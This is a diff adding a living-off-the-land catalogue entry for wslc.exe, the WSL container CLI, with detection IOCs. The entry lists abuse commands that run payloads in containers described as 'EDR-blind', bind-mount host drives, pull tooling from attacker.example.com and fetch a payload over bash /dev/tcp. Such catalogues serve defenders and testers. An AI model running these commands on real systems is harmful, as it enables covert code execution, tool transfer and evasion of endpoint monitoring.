@@ -1,0 +1,92 @@
+---
+Name: wslc.exe
+Description: Windows Subsystem for Linux container CLI. Builds, pulls, runs, and executes commands inside Linux (OCI) containers. Ships built-in with WSL and is also shipped as `container.exe`, a byte-for-byte copy (identical file hash) in the same directory.
+Author: Konrad 'unrooted' Klawikowski
+Created: 2026-07-17
+Commands:
+  - Command: |
+      wslc run --rm ubuntu:latest bash -c "{CMD}"
+    Description: 'Pulls (if not already present) and runs a throwaway Linux container, executing an arbitrary command inside it.'
+    Usecase: Fileless execution of arbitrary commands in an EDR-blind Linux runtime spun up on demand, with no distro pre-provisioning required.
+    Category: Execute
+    Privileges: User
+    MitreID: T1610
+    OperatingSystem: Windows 11 (builds with WSL container support - public preview from 2026-06)
+    Tags:
+      - Execute: CMD
+
+  - Command: |
+      wslc run --rm -it -v C:\Users:/host ubuntu:latest bash -c "{CMD}"
+    Description: 'Bind-mounts a host path (here the entire `C:` drive) into the container via virtiofs so the Linux payload can read, stage, or modify arbitrary host files while running outside host process visibility.'
+    Usecase: Read, stage, or tamper with arbitrary host files from an EDR-blind container whose host-side process tree is masked by the WSL VM worker.
+    Category: Execute
+    Privileges: User
+    MitreID: T1610
+    OperatingSystem: Windows 11 (builds with WSL container support - public preview from 2026-06)
+    Tags:
+      - Execute: CMD
+
+  - Command: |
+      wslc exec {CONTAINER} bash -c "{CMD}"
+    Description: 'Executes an additional command inside an already-running container.'
+    Usecase: Repeated command execution inside a persistent container that host process telemetry cannot see into.
+    Category: Execute
+    Privileges: User
+    MitreID: T1610
+    OperatingSystem: Windows 11 (builds with WSL container support - public preview from 2026-06)
+    Tags:
+      - Execute: CMD
+
+  - Command: |
+      wslc pull attacker.example.com/tooling:latest
+    Description: 'Pulls an arbitrary OCI image from a remote (potentially attacker-controlled) registry over the registry pull protocol.'
+    Usecase: Ingress tool transfer - stage attacker tooling on the host as an OCI image via a registry pull.
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 11 (builds with WSL container support - public preview from 2026-06)
+
+  - Command: |
+      wslc run --rm -v C:\Users\Public:/host ubuntu:latest bash -c 'cat < /dev/tcp/192.168.1.10/54 > /host/payload.bin'
+    Description: 'Downloads a file from a remote host using bash''s `/dev/tcp` pseudo-device inside a container and writes it to a bind-mounted host folder.'
+    Usecase: Download a file to the host from within a container, avoiding Windows download binaries entirely.
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 11 (builds with WSL container support - public preview from 2026-06)
+
+  - Command: |
+      wslc build -t payload .
+      wslc run --rm payload
+    Description: 'Builds a Linux image from a local `Containerfile` on the host and runs it.'
+    Usecase: Build and run a container image on the host to execute baked-in payloads in an EDR-blind runtime.
+    Category: Execute
+    Privileges: User
+    MitreID: T1612
+    OperatingSystem: Windows 11 (builds with WSL container support - public preview from 2026-06)
+    Tags:
+      - Execute: CMD
+
+Full_Path:
+  - Path: C:\Program Files\WSL\wslc.exe
+  - Path: C:\Program Files\WSL\container.exe
+
+Detection:
+  - IOC: wslc.exe (or its container.exe alias) process creation invoking the run, exec, build, or pull subcommands
+  - IOC: wslc.exe command line containing `-v`/`--volume` mapping a Windows path (`C:\...`, `\\?\`, drive letters) into a container
+  - IOC: wslc.exe command line containing `bash -c`, `sh -c`, or `/dev/tcp/` - arbitrary shell execution / fileless download inside the container
+  - IOC: wslc.exe with the pull subcommand referencing an unexpected or unknown container registry (anything other than an approved internal registry)
+  - IOC: presence of `Vmmemwslc-cli-<username>` (or `Vmmemwslc-cli-admin-<username>` for an elevated session) process
+  - IOC: minimal or absent child-process telemetry under wslc.exe despite a `run`/`exec` subcommand
+  - IOC: host-side file-creation events on paths corresponding to a `-v` bind-mounted folder
+  - IOC: outbound network connections to container registries (docker.io, ghcr.io, lscr.io, quay.io, or unknown hosts) originating from the wslc networking stack
+
+Resources:
+  - Link: https://learn.microsoft.com/en-us/windows/wsl/wsl-container
+  - Link: https://learn.microsoft.com/en-us/windows/wsl/tutorials/wsl-containers
+  - Link: https://devblogs.microsoft.com/commandline/wsl-container-is-now-available-for-public-preview/
+  - Link: https://github.com/microsoft/WSL/tree/master/src/windows/wslc
+  - Link: https://www.helpnetsecurity.com/2026/06/30/microsoft-linux-wsl-containers/
+
+Acknowledgement:
+  - Person: Konrad 'unrooted' Klawikowski
